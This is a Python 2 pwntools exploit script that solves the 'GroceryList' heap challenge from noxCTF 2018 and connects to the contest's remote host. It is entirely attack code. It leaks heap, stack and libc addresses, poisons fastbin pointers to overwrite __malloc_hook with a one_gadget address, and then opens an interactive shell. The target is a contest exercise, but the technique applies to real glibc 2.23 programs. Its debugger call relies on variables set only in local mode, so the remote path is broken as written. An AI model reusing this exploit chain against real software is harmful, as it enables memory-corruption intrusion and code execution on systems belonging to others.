#!/usr/bin/env python2
# coding: utf-8
# Usage: ./exploit.py MODE=remote LOG_LEVEL=warn NOPTRACE NOASLR

from pwn import *
import itertools

IP = "chal.noxale.com"
PORT = 1232

# context.log_level = 'critical' 
context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']
# context(os='linux',arch='amd64')
mode = args['MODE'].lower()
binary = "./GroceryList"


def r(x): return io.recv(x)
def ru(x): return io.recvuntil(x)
def rud(x): return io.recvuntil(x, drop=True)
def se(x): return io.send(x)
def sel(x): return io.sendline(x)
def pick32(x): return u32(x[:4].ljust(4, '\0'))
def pick64(x): return u64(x[:8].ljust(8, '\0'))

def print_list():
    sel("1")
    # rud("Exit")
    rud("----------")
    data = rud("----------")
    print data
    return data
    # print io.recvrepeat(timeout=0.5)

def add(ssize, content):
    # 1 --> 0x10
    # 2 --> 0x38
    # 3 --> 0x60
    # rud("Exit")
    sel(str(2))
    rud("Large")
    sel(str(ssize))
    rud("name: ")
    sel(content)

def empty(ssize):
    # 1 --> 0x10
    # 2 --> 0x38
    # 3 --> 0x60
    # rud("Exit")
    sel(str(3))
    rud("Large")
    sel(str(ssize))
    rud("add?")
    sel(str(1))

def example():
    sel(str(6))
    rud("added")

def edit(id, content):
    # rud("Exit")
    sel(str(5))
    rud("edit?")
    sel(str(id))
    rud("name: ")
    sel(content)

def remove(id):
    # rud("Exit")
    sel(str(4))
    rud("remove?")
    sel(str(id))

if mode == "remote":
    context.noptrace = True
    io = remote(IP, PORT)
else:
    io = process(binary)
    proc_base = io.libs()[
        "/home/vagrant/DongFeng/noxCTF2018/pwn/GroceryList/GroceryList"]
    libc_bb = io.libs()['/lib/x86_64-linux-gnu/libc-2.23.so']

print io.recvline()
one_gg = 0xf02a4

gdb.attach(io, '''
b *0x{:x}
b *0x{:x}
c
'''.format(proc_base+0x0000000000001113, libc_bb + one_gg) # print_list和onegadget下断点
)

# '''.format(libc_bb + one_gg)

add(1, "A"*0x10)
add(1, "B"*0x10)
add(1, "C"*0x10)
add(1, "D"*0x10)
add(1, "E"*0x10)
add(1, "F"*0x10)
add(1, "G"*0x10)
add(3, "H"*0x60)
add(3, "I"*0x60)
example()


remove(2)
remove(2)
remove(5)
remove(5)

empty(1)
data = print_list()
print "[+] ", data
heap_address = data.split("6. ")[1][:8].strip("\n")
heap_address = u64(heap_address.ljust(8, "\x00"))
stack_address = data.split("6. ")[0].split("5. ")[1].strip("\n")
stack_address = u64(stack_address.ljust(8, "\x00"))
print "[+] HEAP", hex(heap_address)
print "[+] STAC", hex(stack_address)

edit(1, "d"*16+p64(0)+p64(0x21)+p64(stack_address-0xb-0x10))
print_list()

empty(1)
print_list()

# pause()
empty(1)
data = print_list()
print "[+] ", data
libc_address = data.split("8. ")[1][:8].strip("\n")
libc_address = u64(libc_address.ljust(8, "\x00"))
# print "[+] LIBC", hex(libc_address)
libc_base = libc_address - 0x20740-240
print "[+] LIBC", hex(libc_base)


edit(8, p64(libc_address) + p64(0)*3)

empty(3)
print_list()

one_gadget_address = libc_base + one_gg
new_malloc_hook = libc_base + 0x00000000003c4b10 - 0x20 + 0x5 - 0x8

edit(4, "d"*16+p64(0)+p64(0x71)+p64(new_malloc_hook))
print_list()

empty(3)
print_list()

# pause()
empty(3)
print_list()

edit(11, "A"*19 + p64(one_gadget_address))
print_list()

empty(1)

io.interactive()

